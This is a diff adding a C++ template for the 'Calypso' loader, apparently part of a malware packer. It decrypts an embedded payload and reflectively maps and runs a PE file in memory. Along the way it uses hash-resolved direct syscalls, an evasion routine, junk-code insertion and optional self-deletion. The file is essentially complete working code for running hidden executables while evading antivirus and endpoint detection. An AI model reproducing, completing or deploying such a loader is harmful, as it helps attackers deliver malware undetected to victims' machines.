@@ -1,0 +1,259 @@
+// Calypso loader - Run-PE via syscalls
+// Based on NimSyscallPacker's PELoad by @ShitSecure
+#include <windows.h>
+#include <winternl.h>
+
+#include "obfuscate.hpp.in"
+#include "syscalls.hpp.in"
+#include "crypto_stub.hpp.in"
+#include "common.hpp.in"
+#include "evasion.hpp.in"
+
+{{JUNK_CODE_BLOCKS}}
+
+// Encrypted payload
+{{ENCRYPTED_PAYLOAD}}
+
+// Encryption key
+{{KEY_DATA}}
+
+static constexpr size_t ORIGINAL_SIZE = {{ORIGINAL_SIZE}};
+
+// PE relocation entry
+struct BASE_RELOCATION_ENTRY {
+    WORD Offset : 12;
+    WORD Type   : 4;
+};
+
+static void run_pe(uint8_t* pe_data, size_t pe_size) {
+    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_data);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+
+    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_data + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+
+    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
+    PVOID image_base = reinterpret_cast<PVOID>(nt->OptionalHeader.ImageBase);
+
+    // Try to allocate at preferred base
+    auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
+    if (!NtAVM) return;
+
+    HANDLE hProc = GetCurrentProcess();
+    NTSTATUS status = NtAVM(hProc, &image_base, 0, &image_size,
+                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    ULONGLONG delta = 0;
+    if (status != 0) {
+        // Failed at preferred base, allocate anywhere
+        image_base = nullptr;
+        image_size = nt->OptionalHeader.SizeOfImage;
+        status = NtAVM(hProc, &image_base, 0, &image_size,
+                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (status != 0) return;
+        delta = reinterpret_cast<ULONGLONG>(image_base) - nt->OptionalHeader.ImageBase;
+    }
+
+    // Copy headers
+    memcpy(image_base, pe_data, nt->OptionalHeader.SizeOfHeaders);
+
+    // Copy sections
+    auto section = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (section[i].SizeOfRawData > 0) {
+            void* dest = reinterpret_cast<BYTE*>(image_base) + section[i].VirtualAddress;
+            void* src = pe_data + section[i].PointerToRawData;
+            memcpy(dest, src, section[i].SizeOfRawData);
+        }
+    }
+
+    // Process relocations if we're not at preferred base
+    if (delta != 0) {
+        auto& reloc_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (reloc_dir.Size > 0) {
+            auto reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
+                reinterpret_cast<BYTE*>(image_base) + reloc_dir.VirtualAddress);
+            auto reloc_end = reinterpret_cast<BYTE*>(reloc) + reloc_dir.Size;
+
+            while (reinterpret_cast<BYTE*>(reloc) < reloc_end && reloc->SizeOfBlock > 0) {
+                DWORD entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
+                                sizeof(BASE_RELOCATION_ENTRY);
+                auto entry = reinterpret_cast<BASE_RELOCATION_ENTRY*>(reloc + 1);
+
+                for (DWORD j = 0; j < entries; j++) {
+                    if (entry[j].Type == IMAGE_REL_BASED_DIR64) {
+                        auto patch_addr = reinterpret_cast<ULONGLONG*>(
+                            reinterpret_cast<BYTE*>(image_base) +
+                            reloc->VirtualAddress + entry[j].Offset);
+                        *patch_addr += delta;
+                    } else if (entry[j].Type == IMAGE_REL_BASED_HIGHLOW) {
+                        auto patch_addr = reinterpret_cast<DWORD*>(
+                            reinterpret_cast<BYTE*>(image_base) +
+                            reloc->VirtualAddress + entry[j].Offset);
+                        *patch_addr += static_cast<DWORD>(delta);
+                    }
+                }
+
+                reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
+                    reinterpret_cast<BYTE*>(reloc) + reloc->SizeOfBlock);
+            }
+        }
+    }
+
+    // Resolve imports
+    auto& import_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (import_dir.Size > 0) {
+        auto import_desc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
+            reinterpret_cast<BYTE*>(image_base) + import_dir.VirtualAddress);
+
+        while (import_desc->Name != 0) {
+            auto dll_name = reinterpret_cast<const char*>(
+                reinterpret_cast<BYTE*>(image_base) + import_desc->Name);
+            HMODULE hDll = LoadLibraryA(dll_name);
+            if (!hDll) { import_desc++; continue; }
+
+            auto thunk = reinterpret_cast<PIMAGE_THUNK_DATA>(
+                reinterpret_cast<BYTE*>(image_base) +
+                (import_desc->OriginalFirstThunk ? import_desc->OriginalFirstThunk
+                                                  : import_desc->FirstThunk));
+            auto iat = reinterpret_cast<PIMAGE_THUNK_DATA>(
+                reinterpret_cast<BYTE*>(image_base) + import_desc->FirstThunk);
+
+            while (thunk->u1.AddressOfData != 0) {
+                FARPROC func;
+                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+                    func = GetProcAddress(hDll,
+                        MAKEINTRESOURCEA(IMAGE_ORDINAL(thunk->u1.Ordinal)));
+                } else {
+                    auto import_by_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
+                        reinterpret_cast<BYTE*>(image_base) + thunk->u1.AddressOfData);
+                    func = GetProcAddress(hDll, import_by_name->Name);
+                }
+                iat->u1.Function = reinterpret_cast<ULONG_PTR>(func);
+                thunk++;
+                iat++;
+            }
+            import_desc++;
+        }
+    }
+
+    // Set section permissions
+    auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
+    if (NtPVM) {
+        section = IMAGE_FIRST_SECTION(nt);
+        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            DWORD prot = PAGE_READONLY;
+            DWORD chars = section[i].Characteristics;
+            if (chars & IMAGE_SCN_MEM_EXECUTE) {
+                prot = (chars & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
+            } else if (chars & IMAGE_SCN_MEM_WRITE) {
+                prot = PAGE_READWRITE;
+            }
+
+            PVOID sec_addr = reinterpret_cast<BYTE*>(image_base) + section[i].VirtualAddress;
+            SIZE_T sec_size = section[i].Misc.VirtualSize;
+            ULONG old_prot;
+            NtPVM(hProc, &sec_addr, &sec_size, prot, &old_prot);
+        }
+    }
+
+    // Flush instruction cache
+    FlushInstructionCache(hProc, image_base, image_size);
+
+    // Update the image base in the new NT headers
+    auto new_nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
+        reinterpret_cast<BYTE*>(image_base) + dos->e_lfanew);
+    new_nt->OptionalHeader.ImageBase = reinterpret_cast<ULONG_PTR>(image_base);
+
+    // Call entry point
+    auto entry = reinterpret_cast<BYTE*>(image_base) + nt->OptionalHeader.AddressOfEntryPoint;
+
+    if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
+        using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
+        auto pDllMain = reinterpret_cast<DllMain_t>(entry);
+        pDllMain(reinterpret_cast<HINSTANCE>(image_base), DLL_PROCESS_ATTACH, NULL);
+    } else {
+        auto pMain = reinterpret_cast<int(*)()>(entry);
+        pMain();
+    }
+}
+
+{{#IF DLL_ENTRY}}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hinstDLL);
+        if (!init_syscalls()) return TRUE;
+        if (!evasion_init()) return TRUE;
+
+        // Decrypt and decompress (same pattern as shellcode loader)
+        uint8_t decrypted[{{PAYLOAD_SIZE}} + 256];
+        size_t decrypted_len = sizeof(decrypted);
+        decrypt_payload(payload, payload_len, key, key_len, decrypted, &decrypted_len);
+
+{{#IF COMPRESS_ZLIB}}
+        uint8_t decompressed[ORIGINAL_SIZE + 256];
+        size_t decompressed_len = sizeof(decompressed);
+        decompress_zlib(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len);
+        run_pe(decompressed, decompressed_len);
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+        uint8_t decompressed[ORIGINAL_SIZE + 256];
+        size_t decompressed_len = sizeof(decompressed);
+        decompress_lz4(decrypted, decrypted_len, decompressed, sizeof(decompressed), &decompressed_len);
+        run_pe(decompressed, decompressed_len);
+{{#ENDIF}}
+{{#IF COMPRESS_NONE}}
+        run_pe(decrypted, decrypted_len);
+{{#ENDIF}}
+    }
+    return TRUE;
+}
+{{DLL_EXPORTS}}
+{{#ENDIF}}
+
+{{#IF EXE_ENTRY}}
+int main() {
+    if (!init_syscalls()) return 1;
+    if (!evasion_init()) return 1;
+
+    uint8_t* encrypted = payload;
+    size_t encrypted_len = payload_len;
+
+    // Allocate on heap for large PEs
+    auto* decrypted = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encrypted_len + 256));
+    size_t decrypted_len = encrypted_len + 256;
+    decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len);
+
+{{#IF COMPRESS_ZLIB}}
+    auto* decompressed = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+    size_t decompressed_len = ORIGINAL_SIZE + 256;
+    decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+    run_pe(decompressed, decompressed_len);
+    SecureZeroMemory(decompressed, ORIGINAL_SIZE + 256);
+    HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_LZ4}}
+    auto* decompressed = reinterpret_cast<uint8_t*>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
+    size_t decompressed_len = ORIGINAL_SIZE + 256;
+    decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len);
+    run_pe(decompressed, decompressed_len);
+    SecureZeroMemory(decompressed, ORIGINAL_SIZE + 256);
+    HeapFree(GetProcessHeap(), 0, decompressed);
+{{#ENDIF}}
+{{#IF COMPRESS_NONE}}
+    run_pe(decrypted, decrypted_len);
+{{#ENDIF}}
+
+    SecureZeroMemory(decrypted, encrypted_len + 256);
+    HeapFree(GetProcessHeap(), 0, decrypted);
+
+{{#IF SELF_DELETE}}
+    self_delete();
+{{#ENDIF}}
+
+    return 0;
+}
+{{#ENDIF}}
